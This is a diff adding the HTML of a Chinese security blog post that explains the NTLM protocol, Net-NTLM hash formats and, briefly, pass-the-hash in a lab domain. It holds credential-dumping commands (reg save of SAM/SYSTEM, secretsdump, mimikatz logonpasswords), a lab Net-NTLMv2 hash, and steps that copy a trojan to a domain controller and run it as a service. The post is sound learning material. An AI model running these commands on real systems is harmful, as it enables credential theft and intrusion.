@@ -1,0 +1,1065 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  data-theme="dark" >
+  <head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script src="https://www.googletagmanager.com/gtag/js?id=true"></script>
+  <script data-pjax>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+
+    gtag('config', 'true');
+  </script>
+  <!-- End Google Analytics -->
+
+
+  
+
+  
+  <script async src="https://hm.baidu.com/hm.js?true"></script>
+  <script data-pjax>
+    var _hmt = _hmt || [];
+    _hmt.push(["_trackPageview", location.pathname]);
+  </script>
+
+
+  
+  <script>window.icon_font = '4552607_tq6stt6tcg';window.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.outdate = {"enable":true,"daysAgo":180,"message":"本文最后更新于 {time}，请注意文中内容可能已经发生变化。"};</script>
+  
+  
+  <title>
+    NTLM |
+    
+    yyjccc的博客
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CUbuntu%20Mono:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CUbuntu%20Mono:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_tq6stt6tcg.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  <meta name="description" content="NTLM 协议是 Microsoft 环境中使用的身份验证协议。特别是，它允许用户向服务器证明其身份，以便使用该服务器提供的服务。PTH在域渗透中并不陌生，hash 传递攻击 。NTLM Relay ,NTLM认证协议的中间人攻击,这些都设计到NTLM Hash 和Net-NTLM Hash 本文就来具体介绍 There are two possible scenarios:  用户使用服务器本地">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NTLM">
+<meta property="og:url" content="https://yyjccc.github.io/2024/11/02/NTLM/index.html">
+<meta property="og:site_name" content="yyjccc的博客">
+<meta property="og:description" content="NTLM 协议是 Microsoft 环境中使用的身份验证协议。特别是，它允许用户向服务器证明其身份，以便使用该服务器提供的服务。PTH在域渗透中并不陌生，hash 传递攻击 。NTLM Relay ,NTLM认证协议的中间人攻击,这些都设计到NTLM Hash 和Net-NTLM Hash 本文就来具体介绍 There are two possible scenarios:  用户使用服务器本地">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yyjccc.github.io/img/24-11-2/1.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/24-11-2/2.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/24-11-2/3.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/24-11-2/4.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/24-11-2/5.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/24-11-2/6.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/24-11-2/7.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/24-11-2/8.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/24-11-2/9.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/24-11-2/10.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/24-11-2/11.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/24-11-2/12.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/24-11-2/13.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/24-11-2/14.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/24-11-2/15.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/24-11-2/16.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/24-11-2/17.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/24-11-2/18.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/24-11-2/19.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/24-11-2/20.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/24-11-2/21.png">
+<meta property="article:published_time" content="2024-11-01T16:49:12.583Z">
+<meta property="article:modified_time" content="2024-11-01T16:58:37.770Z">
+<meta property="article:author" content="Yyjccc">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="协议">
+<meta property="article:tag" content="NTLM">
+<meta property="article:tag" content="横向移动">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yyjccc.github.io/img/24-11-2/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="yyjccc的博客" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+    
+      
+<link rel="stylesheet" href="https://npm.webcache.cn/gitalk/dist/gitalk.css">
+
+    
+  
+  
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>
+
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.0.1/dist/aos.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+  <body>
+    
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff5252" />
+          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+         M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="#ff5252" />
+        </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/">首页</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/archives">归档</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/about">关于</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/friend">友链</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+    
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索"></a>
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <img fetchpriority="high" src="/images/cover/6.jpg" alt="NTLM">
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">NTLM</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content">
+          
+          <section id="main"><article id="post-NTLM" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2024/11/02/NTLM/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2024-11-01T16:49:12.583Z" itemprop="datePublished">2024-11-02</time>
+    <time style="display: none;" id="post-update-time">2024-11-02</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Windows/" data-aos="zoom-in">Windows</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <blockquote id="outdate-blockquote" style="display: none;"><p></p></blockquote>
+      
+      
+        <p>NTLM 协议是 Microsoft 环境中使用的身份验证协议。特别是，它允许用户向服务器证明其身份，以便使用该服务器提供的服务。PTH在域渗透中并不陌生，hash 传递攻击 。NTLM Relay ,NTLM认证协议的中间人攻击,这些都设计到NTLM Hash 和Net-NTLM Hash 本文就来具体介绍</p>
+<p>There are two possible scenarios:</p>
+<ul>
+<li>用户使用服务器本地帐户的凭据，在这种情况下，服务器在其本地数据库中拥有用户的密码，并且能够对用户进行身份验证；</li>
+<li>在Active Directory域环境中，用户在身份验证过程中使用域帐户，在这种情况下，服务器将必须要求域控制器验证用户提供的信息。</li>
+</ul>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="Local-account"><a href="#Local-account" class="headerlink" title="Local account"></a>Local account</h3><p>服务器需要存储本地用户及其密码的哈希值。该数据库的名称是SAM （安全帐户管理器）。 SAM 可以在注册表中找到，特别是使用regedit工具，但仅当以SYSTEM身份访问时。可以使用<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">psexec</a>作为SYSTEM打开它：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">psexec.exe -i -s regedit.exe</span><br></pre></td></tr></tbody></table></figure>
+
+<p>psexec 是啥，先暂时跳过，之后再补</p>
+<p>在本地磁盘上对应着文件：C:\Windows\System32\SAM</p>
+<p>因此它包含本地用户列表及其哈希密码，以及本地组列表。嗯，更准确地说，它包含哈希值的加密版本。但由于解密它们所需的所有信息也都在注册表中（SAM 和 SYSTEM），因此我们可以有把握地说它们的哈希版本存储在那里。如果你想了解解密是如何工作的，可以去查看<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py#L1124">secretsdump.py代码</a>或<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_lsadump.c">Mimikatz代码</a>。(嗯，解密代码先跳过)</p>
+<p>可以备份 SAM 和 SYSTEM 数据库以提取用户Hash</p>
+<p>首先我们将两个数据库保存在一个文件中:</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">reg.exe save hklm\sam save.save</span><br><span class="line">reg.exe save hklm\system system.save</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后，我们可以使用<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py">secretsdump.py</a>来提取这些哈希值</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">secretsdump.py <span class="literal">-sam</span> sam.save <span class="literal">-system</span> system.save LOCAL</span><br></pre></td></tr></tbody></table></figure>
+
+<p>使用Mimikatz 抓取Hash:</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="Domain-account"><a href="#Domain-account" class="headerlink" title="Domain account"></a>Domain account</h3><p>使用域帐户完成身份验证后，用户的 NTLM Hash不再存储在服务器上，而是存储在域控制器上。用户想要验证的服务器收到其质询的答案，但它无法检查该答案是否有效。它将将此任务委托给域控制器。</p>
+<p>​	为此，它将使用Netlogon服务，该服务能够与域控制器建立安全连接。这种安全连接称为安全通道。这种安全连接是可能的，因为服务器知道自己的密码，并且域控制器知道服务器密码的哈希值。他们可以安全地交换会话密钥并安全地进行通信。</p>
+<p>域控制器将在其数据库中查找用户的 NTLM哈希值。对于域控来说，它不在 SAM 文件中，因为它是尝试进行身份验证的域帐户。这次它位于一个名为NTDS.DIT的文件中，该文件是所有域用户的数据库。一旦检索到 NTLM 哈希值，它将使用该哈希值和质询计算预期响应，并将该结果与客户端的响应进行比较。</p>
+<p>NTLM 是认证协议，一般嵌套在其他协议之上，如SMB、LDAP 、HTTP</p>
+<p>抓取Hash 会再开一篇 具体学习</p>
+<h2 id="NTLM身份验证"><a href="#NTLM身份验证" class="headerlink" title="NTLM身份验证"></a>NTLM身份验证</h2><p>在Windows认证机制概述那篇文章上，大概讲述了NTLM身份验证的步骤</p>
+<p>现在再来具体看看</p>
+<p>​	NTLM验证是一种Challenge/Response 验证机制，由三种消息组成:通常称为type 1(协商)，type 2(质询)和type 3(身份验证)。</p>
+<p>它基本上是这样工作的:</p>
+<img src="/img/24-11-2/1.png">
+
+<p>抓包：一般使用SMB 触发NTLM认证</p>
+<p>建立IPC共享：</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">net use \\<span class="number">192.168</span>.<span class="number">120.139</span>\ipc<span class="variable">$</span> &lt;密码&gt; /user:&lt;用户名&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>wireshark抓包</p>
+<img src="/img/24-11-2/2.png">
+
+<p>这里面的三个包，对应着NTLM 认证的三步</p>
+<h3 id="1-协商"><a href="#1-协商" class="headerlink" title="1. 协商"></a>1. 协商</h3><p>​	由client端向server端请求</p>
+<p>​	这个过程是客户端向服务器发送type 1(协商)消息,它主要包含客户端支持和服务器请求的功能列表。</p>
+<p>主要包含以下结构：</p>
+<img src="/img/24-11-2/3.png">
+
+<p>Signature (8 bytes): 8字节 必须包含字符数组：(‘N’, ‘T’, ‘L’, ‘M’, ‘S’, ‘S’, ‘P’, ‘\0’)</p>
+<p>MessageType (4 bytes): 表示消息类型，值必须为 0x0000001</p>
+<p>数据包如下：</p>
+<img src="/img/24-11-2/4.png">
+
+<p>协商的数据包可以看到，有许多的标志位，还有一些版本信息</p>
+<p>字段具体含义，见官方文档：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/b34032e5-3aae-4bc6-84c3-c6d80eadf7f2">NEGOTIATE_MESSAGE</a></p>
+<h3 id="2-质询"><a href="#2-质询" class="headerlink" title="2.质询"></a>2.质询</h3><p>​	由server端向client端响应</p>
+<p>​	这个过程是服务器用type 2消息(质询)进行响应，这包含服务器支持和同意的功能列表。但是，最重要的是，它包含服务器产生的Challenge。</p>
+<p>主要 包含以下结构：</p>
+<img src="/img/24-11-2/5.png">
+
+<p>其中最主要的信息是服务端返回的challenge。后面加密验证依赖于challenge</p>
+<img src="/img/24-11-2/6.png">
+
+<p>Chanllenge 即 NTLM Server Challenge</p>
+<p>字段具体含义，见官方文档：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/801a4681-8809-4be9-ab0d-61dcfe762786">CHALLENGE_MESSAGE</a></p>
+<h3 id="3-身份验证"><a href="#3-身份验证" class="headerlink" title="3.身份验证"></a>3.身份验证</h3><p>​	由client端向server端请求</p>
+<p>​	这个过程客户端接收到challenge之后，使用用户hash与challenge进行加密运算得到response，将response,username,challenge发给服务器。消息中的response是最关键的部分，因为它向服务器证明客户端用户已经知道帐户密码。</p>
+<p>主要包含以下结构：</p>
+<img src="/img/24-11-2/7.png">
+
+<p>这里的Challeng不同于第二步中的Challenge，这里的Challenge是一个随机的客户端nonce。</p>
+<p>MIC是校验和，设计MIC主要是为了防止这个包中途被修改</p>
+<img src="/img/24-11-2/8.png">
+
+<p>session_key是在要求进行签名的时候用的，用来进行协商加密密钥，可能有些文章会说session_key就是加密密钥，需要拥有用户hash才能计算出来，因此攻击者算不出来，就无法加解密包。但是想想就不可能，这个session_key已经在流量里面明文传输，那攻击者拿到之后不就可以直接加解密包了。当然这是后话，后面讲签名的时候会详细讲讲这个问题。</p>
+<p>如果想仔细理解每个字段的值请阅读官方文档<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/033d32cc-88f9-4483-9bf2-b273055038ce">AUTHENTICATE_MESSAGE</a></p>
+<h3 id="Net-ntlm-hash"><a href="#Net-ntlm-hash" class="headerlink" title="Net-ntlm hash"></a>Net-ntlm hash</h3><p>​	在第三步的响应中，存在6种响应类型：</p>
+<ul>
+<li>LM(LAN Manager)响应 (LM Response)- 由大多数较早的客户端发送，这是“原始”响应类型。</li>
+<li>NTLM v1响应(NTLM v1 Response) - 这是由基于NT的客户端发送的，包括Windows 2000和XP。</li>
+<li>NTLMv2响应 (NTLM v2 Response)- 在Windows NT Service Pack 4中引入的一种较新的响应类型。它替换启用了 NTLM版本2的系统上的NTLM响应。</li>
+<li>LMv2响应(LMv2 Response) - 替代NTLM版本2系统上的LM响应。</li>
+<li>NTLM2会话响应(NTLM2 Session Response) - 用于在没有NTLMv2身份验证的情况下协商NTLM2会话安全性时，此方案会更改LM NTLM响应的语义。</li>
+<li>匿名响应(Anonymous Response) - 当匿名上下文正在建立时使用; 没有提供实际的证书，也没有真正的身份验证。“存 根”字段显示在类型3消息中。</li>
+</ul>
+<p>这六种使用的加密流程一样，都是前面我们说的Challenge/Response 验证机制,区别在Challenge和加密算法不同。</p>
+<p>这里我们侧重讲下NTLM v1响应和NTLMv2响应</p>
+<p>这些响应可以在本地安全策略→本地策略→安全选项→网络安全：LAN 管理器身份验证级别中配置。</p>
+<p>注册表位置为：HKLM\SYSTEM\CurrentControlSet\Control\Lsa\LmCompatibilityLevel</p>
+<table>
+<thead>
+<tr>
+<th>Value</th>
+<th>Options</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td>发送 LM NTLM 响应</td>
+<td>客户端使用 LM 和 NTLM 身份验证，而决不会使用 NTLMv2 会话安全；域控制器接受 LM、NTLM 和 NTLMv2 身份验证。</td>
+</tr>
+<tr>
+<td>1</td>
+<td>发送 LM 和 NTLM - 如果已协商，则使用 NTLMv2 会话安全</td>
+<td>客户端使用 LM 和 NTLM 身份验证并在服务器支持时使用 NTLMv2 会话安全。 域控制器接受 LM、NTLM 和 NTLMv2 身份验证。</td>
+</tr>
+<tr>
+<td>2</td>
+<td>仅发送 NTLM 响应</td>
+<td>客户端只使用 NTLM 身份验证并在服务器支持时使用 NTLMv2 会话安全。 域控制器接受 LM、NTLM 和 NTLMv2 身份验证。</td>
+</tr>
+<tr>
+<td>3</td>
+<td>仅发送 NTLMv2 响应</td>
+<td>客户端只使用 NTLMv2 身份验证并在服务器支持时使用 NTLMv2 会话安全。 域控制器接受 LM、NTLM 和 NTLMv2 身份验证。</td>
+</tr>
+<tr>
+<td>4</td>
+<td>仅发送 NTLMv2 响应/拒绝 LM</td>
+<td>客户端只使用 NTLMv2 身份验证并在服务器支持时使用 NTLMv2 会话安全。 域控制器拒绝 LM，而只接受 NTLM 和 NTLMv2 身份验证。</td>
+</tr>
+<tr>
+<td>5</td>
+<td>仅发送 NTLMv2 响应/拒绝 LM 和 NTLM</td>
+<td>客户端只使用 NTLMv2 身份验证并在服务器支持时使用 NTLMv2 会话安全。 域控制器拒绝 LM 和 NTLM，而只接受 NTLMv2 身份验证。</td>
+</tr>
+</tbody></table>
+<p>各系统的默认值为：</p>
+<ul>
+<li>Windows 2000 以及 Windows XP: 发送 LM &amp; NTLM 响应</li>
+<li>Windows Server 2003: 仅发送 NTLM 响应</li>
+<li>Windows Vista、Windows Server 2008、Windows 7 以及 Windows Server 2008 R2 及以上: 仅发送 NTLMv2 响应</li>
+</ul>
+<p>再次回顾NTLM v1 与NTLM v2的区别</p>
+<ul>
+<li>长度区别：v2是16位的Challenge，而v1是8位的Challenge</li>
+<li>加密算法区别：v1是将 16字节的NTLM hash空填充为21个字节，然后分成三组，每组7比特，作为3DES加密算法的三组密钥，加密Server发来的Challenge。 将这三个密文值连接起来得到response。</li>
+</ul>
+<p>而v2是的加密算法是</p>
+<p>(1). 将Unicode后的大写用户名与Unicode后的身份验证目标（在Type 3消息的”TargetName”字段中指定的域或服务器名称）拼在一起。请注意，用户名将转换为大写，而身份验证目标区分大小写，并且必须与“TargetName”字段中显示的大小写匹配。使用16字节NTLM哈希作为密钥，得到一个值。</p>
+<p>(2) 构建一个blob信息</p>
+<img src="/img/24-11-2/9.png">
+
+<p>(3). 使用16字节NTLMv2哈希作为密钥，将HMAC-MD5消息认证代码算法加密一个值(来自type 2的Challenge与Blob拼接在一起)。得到一个16字节的NTProofStr。</p>
+<p>(4). 将NTProofStr与Blob拼接起来形成得到response。</p>
+<p>至于选择哪个版本的响应由LmCompatibilityLevel决定。</p>
+<p>Challenge/Response验证机制即NTLM身份验证里面第三步 response里面包含Net-ntlm hash，NTLM v1响应和NTLMv2响应对应的就是Net-ntlm hash分为Net-ntlm hash v1和Net-ntlm hash v2。</p>
+<p>Net-ntlm hash v1的格式为：</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">username::hostname:LM response:NTLM response:challenge</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Net-ntlm hash v2的格式为：</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">username::domain:challenge:HMAC<span class="literal">-MD5</span>:blob</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li>上面Net-NTLM中的challenge是第二步质询 服务器返回的challenge不是第三步中 流量包里面的client Challenge</li>
+</ul>
+<p>在上面数据包中也就是：e0b96d6854c55339</p>
+<ul>
+<li>HMAC-MD5对应第三个数据包中的NTProofSt</li>
+</ul>
+<p>在上面数据包中就是：50a43613edebfb8f15c0997c186fb8b3</p>
+<ul>
+<li>blob就是response(第三个数据包) 减去NTP1roofStr。(因为在计算response 的时候，response 就是由NTProofStr加上blob)</li>
+</ul>
+<p>在上面数据包中就是：0101000000000000c31a55f4590fdb018e1cea5409304e220000000002000c00590059004a0043004300430001001e00570049004e002d003100550056003000540048005100550054004300490004001400790079006a006300630063002e0063006f006d0003003400570049004e002d00310055005600300054004800510055005400430049002e00790079006a006300630063002e0063006f006d0005001400790079006a006300630063002e0063006f006d0007000800c31a55f4590fdb0106000400020000000800300030000000000000000100000000200000983757a7cf637c60e63e6f0edc446e3e98de62a80428c403ccafc73c02e0e0e70a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100320030002e003100330038000000000000000000</p>
+<p>最后可以组合得到Net-NTLM v2 Hash:</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">Queziya::yyjccc.com:e0b96d6854c55339:<span class="number">50</span>a43613edebfb8f15c0997c186fb8b3:<span class="number">0101000000000000</span>c31a55f4590fdb018e1cea5409304e220000000002000c00590059004a0043004300430001001e00570049004e002d003100550056003000540048005100550054004300490004001400790079006a006300630063002e0063006f006d0003003400570049004e002d00310055005600300054004800510055005400430049002e00790079006a006300630063002e0063006f006d0005001400790079006a006300630063002e0063006f006d0007000800c31a55f4590fdb0106000400020000000800300030000000000000000100000000200000983757a7cf637c60e63e6f0edc446e3e98de62a80428c403ccafc73c02e0e0e70a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100320030002e003100330038000000000000000000</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><p>这里就简单过一下，体会一下打pth,后续再详细学习</p>
+<h3 id="NTLM-Hash-获取"><a href="#NTLM-Hash-获取" class="headerlink" title="NTLM Hash 获取"></a>NTLM Hash 获取</h3><p>这里只介绍使用mimikazt,另外的已经另外写了一篇了</p>
+<ol>
+<li>提升至debug 权限,拥有dump 内存的权限</li>
+</ol>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></tbody></table></figure>
+
+<ol>
+<li>dump 本地hash</li>
+</ol>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">sekurlsa::logonPasswords</span><br></pre></td></tr></tbody></table></figure>
+
+<p>或者读取SAM数据库获取用户Hash,获取系统所有本地用户的hash</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="Hash-传递方式"><a href="#Hash-传递方式" class="headerlink" title="Hash 传递方式"></a>Hash 传递方式</h3><p>主要是通过445,135,139,5985 (http) 或 5986(https) 这四个端口的服务来进行的</p>
+<h5 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h5><p>这个需要本地管理员权限</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:&lt;用户名&gt;  /domain:&lt;域名或者workgroup&gt; /ntlm:&lt;ntlm<span class="literal">-hash</span>&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>这里pth 只介绍用Mimikatz 打SMB 。当然，PTH远不止这一个手法</p>
+<p>Mimikatz pth 成功后并不是直接拿到对方机器的shell，而是拿到对方SMB服务的权限，能直接使用SMB连接</p>
+<p>会弹出一个交互式的终端,这个终端以及伪造为我们指定的hash和用户，可以直接访问smb服务，我们可以通过copy文件，然后执行计划任务去拿到shell</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\<span class="number">192.168</span>.<span class="number">120.139</span>\c<span class="variable">$</span>          //列举域控的C盘下的目录</span><br><span class="line">//为了进一步扩大战果，我们还可以把木马上传到域控下</span><br><span class="line"><span class="built_in">copy</span> hack.exe \\<span class="number">192.168</span>.<span class="number">120.139</span>\c<span class="variable">$</span>       //上传木马hack.exe到域控的C盘下</span><br><span class="line">//在域控上创建服务启动木马,启动一个计划任务</span><br><span class="line"><span class="built_in">sc</span> \\[<span class="type">computer</span>-<span class="type">name.domain</span>-<span class="type">name</span>] create [<span class="type">service</span> <span class="type">name</span>] binpath=<span class="string">"[file path]"</span></span><br><span class="line">如：<span class="built_in">sc</span> \\DC01.yyjccc.com create update binpath= <span class="string">"c:\hack.exe"</span></span><br><span class="line"><span class="built_in">sc</span> \\DC01.yyjccc.com <span class="built_in">start</span> update         // 在域控上立即启动该服务</span><br><span class="line"><span class="built_in">sc</span> \\DC01.yyjccc.com delete update      // 在域控上立即删除该服务</span><br><span class="line"></span><br><span class="line">或者直接连接域控,在本地计算机上创建一个网络驱动器z:映射到域控的c:。</span><br><span class="line">net use z: \\<span class="number">192.168</span>.<span class="number">120.139</span>\c<span class="variable">$</span></span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/img/24-11-2/10.png">
+
+<p>也是成功上传文件了不过cs木马落地就被Windows安全中心给杀了，后面再改进</p>
+<p>这个也大致讲了Mimikatz 打pth本质上还是利用IPC来横向移动（这个后面再开一篇学习）</p>
+<p>除此之外，某些情况下可以通过PTH+远程桌面进行横向</p>
+<p>这里pth攻击其实就是在本地起一个程序，然后注入hash凭证</p>
+<h2 id="NTLM-Relay攻击"><a href="#NTLM-Relay攻击" class="headerlink" title="NTLM Relay攻击"></a>NTLM Relay攻击</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>也叫做NTLM重放攻击</p>
